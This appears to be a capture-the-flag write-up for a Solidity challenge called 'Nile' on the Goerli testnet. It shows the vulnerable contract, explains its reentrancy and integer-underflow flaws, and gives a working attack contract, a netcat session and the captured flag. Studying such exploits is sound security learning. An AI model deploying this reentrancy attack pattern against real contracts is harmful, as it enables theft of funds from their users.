# Setup
For this challenge and Andes we of course need an environment to test and deploy the contracts.
I used Remix IDE since it was convenient to get started: https://remix.ethereum.org/
For interacting with the blockchain I used the Metamask Firefox plugin.
These challenges were deployed on the Goerli Testnet so I also needed to get some Goerli Testnet ETH so I used this faucet to mine some: https://goerli-faucet.pk910.de/
All contracts were initially tested in the Remix VM which makes things a lot easier and faster since we dont actually need to put them on the blockchain before finding out we made errors or that our attack doesn't work.

# Nile
Here is the code for this challenge:
```js
pragma solidity ^0.7.6;


contract Nile {
    mapping(address => uint256) balance;
    mapping(address => uint256) redeemable;
    mapping(address => bool) accounts;

    event GetFlag(bytes32);
    event Redeem(address, uint256);
    event Created(address, uint256);
    
    function redeem(uint amount) public {
        require(accounts[msg.sender]);
        require(redeemable[msg.sender] > amount);

        (bool status, ) = msg.sender.call("");

        if (!status) {
            revert();
        }

        redeemable[msg.sender] -= amount;
        balance[msg.sender] += amount;
        emit Redeem(msg.sender, amount);
    }

    function createAccount() public {
        balance[msg.sender] = 0;
        redeemable[msg.sender] = 100;
        accounts[msg.sender] = true;

        emit Created(msg.sender, 100);
    }

    function createEmptyAccount() public {
        // empty account starts with 0 balance
        balance[msg.sender] = 0;
        accounts[msg.sender] = true;
    }

    function deleteAccount() public {
        require(accounts[msg.sender]);
        balance[msg.sender] = 0;
        redeemable[msg.sender] = 0;
        accounts[msg.sender] = false;
    }

    function getFlag(bytes32 token) public {
        require(accounts[msg.sender]);
        require(balance[msg.sender] > 1000);

        emit GetFlag(token);
    }
}
```

From a quick reading of the code it should be apparent that it is vulnerable to a reentrancy attack ([SWC-107](https://swcregistry.io/docs/SWC-107)).
We know this because it does call() on our sender and it does it after it checks the balance.
We can put code in our sender fallback function that when called will call the redeem() function again and since nothing has yet changed it will bypass those same checks.
The other thing to notice is that the balance in redeemable will underflow ([SWC-101](https://swcregistry.io/docs/SWC-101)) and become a very large number so we only need to do this once and after that we will have enough to call the getFlag function.

This is my solution:
```js
pragma solidity ^0.8.7;

interface INile {
    function redeem(uint amount) external;
    function createAccount() external;
    function createEmptyAccount() external;
    function deleteAccount() external;
    function getFlag(bytes32 token) external;
}

contract AttackNile {
    INile targetContract; // 0xd9145CCE52D386f254917e481eB44e9943F39138
    uint attackTried = 0;

    constructor(address _targetAddress) {
    	targetContract = INile(_targetAddress);
    }

    fallback() external {
        if(attackTried == 0){
            attackTried=1;
            targetContract.redeem(99);
        }
    }
    
    function attack(bytes32 token) public {
        attackTried = 0;
        targetContract.createAccount();
        targetContract.redeem(99);
        targetContract.redeem(10000);
        targetContract.getFlag(token);
    }
}
```

To get the flag we netcat to the host given to us, get the token, pass the token to our attack function, wait for the transaction to be confirmed and then tell the netcat session to check if the flag was emitted on the blockchain.
```
nc -v nile.chall.pwnoh.io 13379
Connection to nile.chall.pwnoh.io (3.132.58.34) 13379 port [tcp/*] succeeded!
Hello! The contract is running at 0x7217bd381C35dd9E1B8Fcbd74eaBac4847d936af on the Goerli Testnet.
Here is your token id: 0xc4386ecaf58a2074fa56939b15257779
Are you ready to receive your flag? (y/n)
y
Here is the flag: buckeye{n0_s4fem4th_t1ll_s0l1d1ty_08}
```
